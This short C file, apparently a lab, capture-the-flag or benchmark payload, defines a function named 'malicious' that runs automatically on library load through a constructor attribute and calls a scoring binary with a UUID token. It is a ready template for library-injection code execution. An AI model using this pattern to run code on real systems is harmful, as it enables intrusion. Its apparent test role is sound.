#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score f41e98aa-5cb9-4e2c-b7c3-aa558be07c79");
}
